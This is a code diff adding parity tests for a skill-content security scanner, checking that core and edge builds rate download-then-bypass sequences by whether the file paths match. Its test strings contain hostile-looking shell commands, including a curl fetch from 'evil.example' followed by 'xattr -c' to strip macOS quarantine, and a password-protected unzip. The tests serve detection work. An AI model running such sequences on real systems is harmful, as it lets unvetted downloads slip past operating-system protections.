@@ -396,3 +396,92 @@ describe('core <-> edge behavioral fixture parity — archive_evasion (SMI-6033 
     ).toBe(false)
   })
 })
+
+// SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
+// utility (security-scanner-edge.fetch-correlation.ts / core's
+// SecurityScanner.fetch-correlation.ts) is now DIRECTORY-PATH-AWARE. It used
+// to match on the final path segment alone, so a coincidental basename
+// collision between two unrelated files supplied the provenance condition
+// that makes gatekeeper_bypass / archive_evasion standalone-critical. Core and
+// edge carry the identical fix, so both must agree on all of these.
+describe('core <-> edge directory-aware fetch-correlation parity (SMI-6033 Wave 3)', () => {
+  it('FP: xattr target sharing only a BASENAME with the fetch destination (different dirs) stays medium on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\n' +
+      'xattr -c ./vendor/other-tool/Helper.app'
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFinding, 'core must still emit the advisory finding').toBeDefined()
+    expect(edgeFinding, 'edge must still emit the advisory finding').toBeDefined()
+    expect(coreFinding?.severity, 'core severity').toBe('medium')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+
+  it('TP control: the SAME directory on both sides still correlates -> critical on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o /tmp/Helper.app https://vendor.example/Helper.app\nxattr -c /tmp/Helper.app'
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFinding?.severity, 'core severity').toBe('critical')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+
+  it('TP control: a bare-filename fetch destination still correlates with a full-path xattr target on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    // `curl -o EvilApp.app` names no directory, so there is no path
+    // information to distinguish by — final-segment matching must stand.
+    const content =
+      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c /Applications/EvilApp.app'
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'gatekeeper_bypass')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find(
+      (f: { type: string }) => f.type === 'gatekeeper_bypass'
+    )
+
+    expect(coreFinding?.severity, 'core severity').toBe('critical')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+
+  it('FP: archive target sharing only a BASENAME with the fetch destination (different dirs) stays medium on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o /tmp/assets.zip https://vendor.example/assets.zip\n' +
+      `unzip -P ${REAL_PASSWORD} ./vendor/font-pack/assets.zip`
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')
+
+    expect(coreFinding?.severity, 'core severity').toBe('medium')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+})
